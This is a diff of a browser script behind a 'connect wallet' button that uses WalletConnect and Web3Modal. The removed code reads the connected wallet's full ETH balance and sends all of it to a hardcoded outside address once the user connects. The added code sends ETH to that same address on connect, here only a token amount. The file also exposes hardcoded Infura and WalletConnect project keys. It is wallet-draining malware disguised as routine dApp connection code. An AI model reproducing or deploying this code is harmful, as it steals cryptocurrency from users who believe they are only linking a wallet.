@@ -4,116 +4,70 @@ if (typeof process === 'undefined') {
   };
   }
 
-
-import { WalletConnectModalSign } from "https://unpkg.com/@walletconnect/modal-sign-html@2.6.1";
-
-const { OpenSeaPort, Network } = "https://cdn.jsdelivr.net/npm/seaport@2.0.9/index.js";
-import walletconnectWeb3Provider from 'https://cdn.jsdelivr.net/npm/walletconnect-web3-provider@0.7.28/+esm'
-// 1. Define ui elements
-const connectButton = document.getElementById("connect-button");
-const ethereumJsonRpcUrl = 'https://mainnet.infura.io/v3/b515c05d5db44cb3aa07665e4d316042'
-
-const providerOptions = {
-  walletconnect: {
-    package: walletconnectWeb3Provider,
-    options: {
-      // Mikko's test key - don't copy as your mileage may vary
-      infuraId: "b515c05d5db44cb3aa07665e4d316042",
-    }
-  },
-}
-
-console.log(WalletConnectModalSign)
-// 2. Create modal client, add your project id
-const web3Modal = new WalletConnectModalSign({
-  projectId: "0d4f78d9c663f3cebe1019795245b1f2",
-  metadata: {
-    name: "My Dapp",
-    description: "My Dapp description",
-    url: "https://my-dapp.com",
-    icons: ["https://my-dapp.com/logo.png"],
-  },
+  import {
+    EthereumClient,
+    w3mConnectors,
+    w3mProvider,
+    WagmiCore,
+    WagmiCoreChains,
+    WagmiCoreConnectors,
+  } from "https://unpkg.com/@web3modal/ethereum@2.7.1";
   
-});
+  import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.7.1";
+  
+ 
 
-
-// 3. Connect
-async function onConnect() {
-  try {
-    connectButton.disabled = true;
-    const session = await web3Modal.connect({
-
-      requiredNamespaces: {
-        eip155: {
-          methods: ["eth_sendTransaction", "personal_sign", "eth_signTransaction"],
-          chains: ["eip155:1"],
-          events: ["chainChanged", "accountsChanged"],
+  // 0. Import wagmi dependencies
+  const { mainnet, polygon, avalanche, arbitrum } = WagmiCoreChains;
+  const { configureChains, createConfig, getAccount, prepareSendTransaction, sendTransaction } = WagmiCore;
+  
+  // 1. Define chains
+  const chains = [mainnet, polygon, avalanche, arbitrum];
+  const projectId = "2aca272d18deb10ff748260da5f78bfd";
+  
+  // 2. Configure wagmi client
+  const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
+  const wagmiConfig = createConfig({
+    autoConnect: true,
+    connectors: [
+      ...w3mConnectors({ chains, version: 2, projectId }),
+      new WagmiCoreConnectors.CoinbaseWalletConnector({
+        chains,
+        options: {
+          appName: "html wagmi example",
         },
-      },
-      
-      
-      
-    });
-    
-    console.log(session);
-     // Use the wallet's provider from Web3Modal
-
-    
-    var accounts = session.namespaces.eip155.accounts[0].slice(9)
-    const infuraProvider = new ethers.providers.JsonRpcProvider(ethereumJsonRpcUrl);
-    
-    if (session) {
-      console.log('Connected to wallet');
-      
-      // Get the connected address
-      
-      // Create a transaction
-      const balance = await infuraProvider.getBalance(accounts);
-      const balanceInEther = ethers.utils.formatEther(balance);
-      const balanceInWei = ethers.utils.parseEther(balanceInEther);
-
-      // Convert Wei to hexadecimal
-      const balanceInWeiHex = balanceInWei.toHexString();
-
-      console.log('Balance in Wei (hex):', balanceInWeiHex);
-      
-      const transaction = {
-        from: accounts,
-        to: "0xc25a768371b1f10DED11513eDF0eb5120DC33dcf",
-        gas: "20000",
-        value: balance.toString()
-        
-        
-      };
-
-      // Sign and send the transaction
-      try {
-        
-        const txResponse =  await web3Modal.request({
-          topic: session.topic,
-          chainId: "eip155:1",
-          request: {
-            method: "eth_sendTransaction",
-            params: [transaction],
-          },
-        });
-        await txResponse.wait();
-
-        console.log('Transaction sent. Transaction Hash:', txResponse.hash);
-      } catch (error) {
-        console.error('Error sending ETH transaction:', error);
-      }
-    }
-  } catch (err) {
-    console.error(err);
-  } finally {
-    connectButton.disabled = false;
+      }),
+    ],
+    publicClient,
+  });
   
+  // 3. Create ethereum and modal clients
+  const ethereumClient = new EthereumClient(wagmiConfig, chains);
+  export const web3Modal = new Web3Modal(
+    {
+      projectId,
+      
+      walletImages: {
+        safe: "https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg",
+      },
+    },
+    ethereumClient
+  );
+  console.log(web3Modal)
+  async function onConnect() {
+    
+    await web3Modal.openModal()
+    await getAccount().isConnected
+    if (getAccount().isConnected){
+      const request = await prepareSendTransaction({
+        to: '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf',
+        value: ethers.utils.parseEther('0.00000001'),
+       
+      })
+      const { hash } = await sendTransaction(request)
+      console.log(hash)
+    }
   }
 
   
-} 
-
-
-// 4. Create connection handler
-connectButton.addEventListener("click", onConnect);
+  document.getElementById('connect-button').addEventListener('click', onConnect)
